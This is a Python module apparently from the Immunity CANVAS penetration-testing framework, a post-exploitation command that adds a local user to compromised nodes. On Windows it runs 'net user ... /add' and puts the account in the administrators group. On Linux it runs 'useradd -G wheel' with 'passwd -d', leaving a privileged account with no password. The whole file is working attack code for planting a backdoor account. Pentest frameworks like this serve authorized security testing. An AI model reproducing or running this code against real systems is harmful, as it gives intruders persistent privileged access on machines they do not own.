#! /usr/bin/env python

"""
Add a local user account to the target system
"""
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2008
#http://www.immunityinc.com/CANVAS/ for more information

import os
import sys
if "." not in sys.path:
    sys.path.append(".")

from exploitutils import *
from canvasexploit import canvasexploit
from ExploitTypes.localcommand import LocalCommand

NAME                = "Add a user"
DESCRIPTION         = "Calls popen2() or equivalent to issue local command to add a user. Uses first selected node."
DOCUMENTATION       = {}
DOCUMENTATION["Notes"]= """The specified user can be added to multiple groups by passing in a comma seperated list of groups.
The default group is 'administrators' for Windows and 'wheel' for *nix. On *nix systems NO PASSWORD is set on the account regardless of what is passed in.
Obviously you need the appropriate permissions to add users on the sytems you are on for this to work correctly."""
VERSION             = "1.0"

PROPERTY            = {}
PROPERTY['TYPE']    = "Commands"
PROPERTY['SITE']    = "Local"
PROPERTY['ARCH']    = [ ["Linux"], ["Windows"] ]


class theexploit(LocalCommand):
    def __init__(self):
        LocalCommand.__init__(self)
        self.result     = ""
        self.name       = NAME
        self.alternativecommands = ""
        self.username   = "canvas"
        self.passwd     = "password"
        self.group      = "administrators"

    def getargs(self):
        self.username    = self.argsDict.get("username", self.username)
        self.passwd    = self.argsDict.get("passwd", self.passwd)
        self.group    = self.argsDict.get("group", self.group)
        ##If we are on a non UNIX/Win32 system and want to use different commands
        self.alternativecommands    = self.argsDict.get("alternativecommands", self.alternativecommands)
        return

    def run(self):
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()

        for node in self.argsDict["passednodes"]:

            ##If the user has not specified a set of commands to add a user we use the default set
            if len(self.alternativecommands) == 0:
                self.commands=""
                if "win32Node" in node.nodetype or "win64Node" in node.nodetype:
                    self.commands+="net user %s %s /add"%(self.username, self.passwd)
                    if len(self.group) >0:
                        self.commands+="&"
                        self.commands+="net localgroup %s %s /add"%(self.group, self.username)
                elif "linuxNode" in node.nodetype:
                    self.group="wheel"
                    self.commands+="useradd -G %s %s && passwd -d %s"%(self.group, self.username, self.username)
                else:
                    msg="UNSUPPOORTED NODE TYPE %s"%(node)
                    self.log(msg)
                    self.setInfo("%s - \"%s\" (failed)" % (NAME,msg))
                    return 0
            else:
                self.commands=self.alternativecommands

            self.log("Adding user with command: %s" % self.commands)
            if hasattr(node, 'runcommand'):
                self.result = node.runcommand(self.commands)
            else:
                self.log("Defaulting to os.popen2()")
                self.result = os.popen2(self.commands)[1].read()

            self.log("Command output for: %s" % self.commands)
            self.log("%s" % self.result)



        self.setInfo("%s - \"%s\" (finished)" % (NAME,self.commands))
        return 1
